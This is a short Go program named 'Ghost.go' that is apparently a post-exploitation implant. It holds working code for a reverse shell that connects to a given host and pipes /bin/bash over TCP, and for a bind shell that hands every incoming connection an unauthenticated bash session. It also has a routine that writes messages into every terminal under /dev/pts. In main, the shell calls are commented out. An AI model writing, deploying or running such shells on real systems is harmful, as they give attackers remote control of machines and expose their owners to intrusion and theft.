//
// Ghost.go
//
// lukem1
// 30 March 2021
//

package main

import (
	"fmt"
	"log"
	"net"
	"os"
	"os/exec"
)


// Write a message to all pts sessions
func ghostsay(msg string) {
	dir := "/dev/pts"
	pts, e := os.ReadDir(dir)
	if e != nil {
		log.Fatal(e)
	}
	
	for _, s := range pts {
		f := fmt.Sprintf("%s/%s", dir, s.Name())
		fmt.Printf("pts: %s\n", f)
		if s.Name() != "ptmx" {
			os.WriteFile(f, []byte(msg), 0666)
		}
	}
}


// dial connects to the specified host:port and creates a reverse shell
func dial(host string, port int) {
	fmt.Printf("Calling %s:%d...\n", host, port)
	
	c, e := net.Dial("tcp",fmt.Sprintf("%s:%d", host, port))
	if e != nil {
		fmt.Printf("Failed to connect.\n")
		return
	}
	fmt.Printf("Connected.\n")
	banner := "Ghost is Listening...\n"
	c.Write([]byte(banner))
	
	shell := exec.Command("/bin/bash")
	shell.Stdin=c;shell.Stdout=c;shell.Stderr=c;
	shell.Run()
}


// bind listens on the specified tcp port and provides a shell
func bind(port int) {
	// Start listening on the specified tcp port
	l, e := net.Listen("tcp", fmt.Sprintf(":%d", port))
	fmt.Printf("Listening on port %d...\n", port) 
	if e != nil {
		fmt.Print("Bind error!")
		fmt.Print(e)
		return
	}
	
	// Close the listener when bind returns
	defer l.Close()
	
	// session func to handle connections
	session := func (c net.Conn) {
		fmt.Printf("Recieved connection!\n")
		banner := "Ghost is Listening...\n"
		c.Write([]byte(banner))
		
		// Execute bash and pass to the connection
		shell := exec.Command("/bin/bash")
		shell.Stdin = c; shell.Stdout = c; shell.Stderr = c;
		shell.Run()
		
		c.Close()
		fmt.Printf("Connection closed!\n")
	}
	
	// Accept any incoming connections
	for {
		c, e := l.Accept()
		if e != nil {
			fmt.Print("Connection Error!")
			fmt.Print(e)
		}
		// Start a goroutine to handle any connections
		go session(c)
	}
}

func main() {
	fmt.Printf("Hello from %d", os.Getpid())
	fmt.Printf(" (ppid: %d, uid: %d)\n", os.Getppid(), os.Getuid())
	
	//bind(4242)
	ghostsay("\nHello\n")
	//dial("", 2424)
}
